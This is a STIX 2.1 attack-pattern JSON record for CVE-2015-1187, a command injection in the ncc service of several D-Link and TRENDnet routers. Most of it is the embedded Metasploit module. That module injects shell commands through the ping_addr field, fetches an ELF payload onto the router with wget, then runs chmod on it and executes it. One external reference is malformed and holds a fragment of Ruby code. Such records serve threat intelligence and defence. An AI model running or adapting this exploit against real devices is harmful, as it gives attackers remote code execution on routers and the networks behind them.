{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1b704135-f3ab-41ba-bd0a-fe2c01fbe52d",
    "created": "2024-08-14T17:03:40.145797Z",
    "modified": "2024-08-14T17:03:40.145801Z",
    "name": "D-Link/TRENDnet NCC Service Command Injection",
    "description": " This module exploits a remote command injection vulnerability on several routers. The vulnerability exists in the ncc service, while handling ping commands. This module has been tested on a DIR-626L emulated environment. Several D-Link and TRENDnet devices are reported as affected, including: D-Link DIR-626L (Rev A) v1.04b04, D-Link DIR-636L (Rev A) v1.04, D-Link DIR-808L (Rev A) v1.03b05, D-Link DIR-810L (Rev A) v1.01b04, D-Link DIR-810L (Rev B) v2.02b01, D-Link DIR-820L (Rev A) v1.02B10, D-Link DIR-820L (Rev A) v1.05B03, D-Link DIR-820L (Rev B) v2.01b02, D-Link DIR-826L (Rev A) v1.00b23, D-Link DIR-830L (Rev A) v1.00b07, D-Link DIR-836L (Rev A) v1.01b03 and TRENDnet TEW-731BR (Rev 2) v2.01b01 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/multi_ncc_ping_exec.rb",
            "external_id": "multi_ncc_ping_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1187"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Mar/15"
        },
        {
            "source_name": "reference",
            "url": "http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10052"
        },
        {
            "source_name": "fail_with(Failure::NoTarget",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking # Only tested on Emulated environment\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link/TRENDnet NCC Service Command Injection',\n      'Description'    => %q{\n        This module exploits a remote command injection vulnerability on several routers. The\n        vulnerability exists in the ncc service, while handling ping commands. This module has\n        been tested on a DIR-626L emulated environment. Several D-Link and TRENDnet devices\n        are reported as affected, including: D-Link DIR-626L (Rev A) v1.04b04, D-Link DIR-636L\n        (Rev A) v1.04, D-Link DIR-808L (Rev A) v1.03b05, D-Link DIR-810L (Rev A) v1.01b04, D-Link\n        DIR-810L (Rev B) v2.02b01, D-Link DIR-820L (Rev A) v1.02B10, D-Link DIR-820L (Rev A)\n        v1.05B03, D-Link DIR-820L (Rev B) v2.01b02, D-Link DIR-826L (Rev A) v1.00b23, D-Link\n        DIR-830L (Rev A) v1.00b07, D-Link DIR-836L (Rev A) v1.01b03 and TRENDnet TEW-731BR (Rev 2)\n        v2.01b01\n      },\n      'Author'         =>\n        [\n          'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery and initial PoC\n          'Tiago Caetano Henriques', # Vulnerability discovery and initial PoC\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-1187'],\n          ['BID', '72816'],\n          ['URL', 'https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Mar/15'],\n          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10052']\n        ],\n      'Targets'        =>\n        # Only tested on D-Link DIR-626L where wget is available\n        [\n          [ 'Linux mipsel Payload',\n            {\n            'Arch' => ARCH_MIPSLE,\n            'Platform' => 'linux'\n            }\n          ],\n          [ 'Linux mipsbe Payload',\n            {\n            'Arch' => ARCH_MIPSBE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DisclosureDate'  => '2015-02-26',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('WRITABLEDIR', [ true, 'A directory where we can write files', '/tmp' ]),\n        OptString.new('EXTURL', [ false, 'An alternative host to request the EXE payload from' ]),\n        OptString.new('TARGETURI', [true, 'The base path to the vulnerable application area', '/ping.ccp']),\n        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 10])\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path)\n      })\n\n      # unknown if other devices also using mini_httpd\n      if res && [500].include?(res.code) && res.headers['Server'] && res.headers['Server'] =~ /mini_httpd/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exec_command(cmd, timeout = 20)\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path),\n        'encode_params' => false,\n        'vars_post' => {\n          'ccp_act' => 'ping_v6',\n          'ping_addr' => '$(' + cmd + ')'\n        }\n      }, timeout)\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def primer\n    @payload_url = get_uri\n    wget_payload\n  end\n\n  def exploit\n    print_status(\"Accessing the vulnerable URL...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    print_status(\"Exploiting...\")\n\n    @pl = generate_payload_exe\n    @payload_url  = ''\n    @dropped_elf = rand_text_alpha(rand(5) + 3)\n\n    if datastore['EXTURL'].blank?\n      begin\n        Timeout.timeout(datastore['HTTPDELAY']) { super }\n      rescue Timeout::Error\n      end\n      chmod_payload\n      exec_payload\n    else\n      @payload_url = datastore['EXTURL']\n      wget_payload\n      chmod_payload\n      exec_payload\n    end\n  end\n\n  def wget_payload\n    upload_path = File.join(datastore['WRITABLEDIR'], @dropped_elf)\n\n    cmd = \"wget${IFS}#{@payload_url}${IFS}-O${IFS}#{upload_path}\"\n\n    print_status(\"Downloading the payload to the target machine...\")\n    res = exec_command(cmd)\n\n    if res && [200].include?(res.code) && res.headers['Server'] && res.headers['Server'] =~ /mini_httpd/\n      register_files_for_cleanup(upload_path)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to download the payload to the target\")\n    end\n  end\n\n  def chmod_payload\n    cmd = \"chmod${IFS}777${IFS}#{File.join(datastore['WRITABLEDIR'], @dropped_elf)}\"\n\n    print_status(\"chmod the payload...\")\n    res = exec_command(cmd, 1)\n\n    unless res\n      fail_with(Failure::Unknown, \"#{peer} - Unable to chmod payload\")\n    end\n\n    Rex.sleep(1)\n  end\n\n  def exec_payload\n    cmd = File.join(datastore['WRITABLEDIR'], @dropped_elf)\n\n    print_status(\"Executing the payload...\")\n    res = exec_command(cmd, 1)\n\n    unless res\n      fail_with(Failure::Unknown, \"#{peer} - Unable to exec payload\")\n    end\n\n    Rex.sleep(1)\n  end\n\n  # Handle incoming requests to the HTTP server\n  def on_request_uri(cli, request)\n    print_status(\"Request: #{request.uri}\")\n    if request.uri =~ /#{Regexp.escape(get_resource)}/\n      print_status('Sending payload...')\n      send_response(cli, @pl)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-26",
    "x_mitre_platforms": [
        "linux"
    ]
}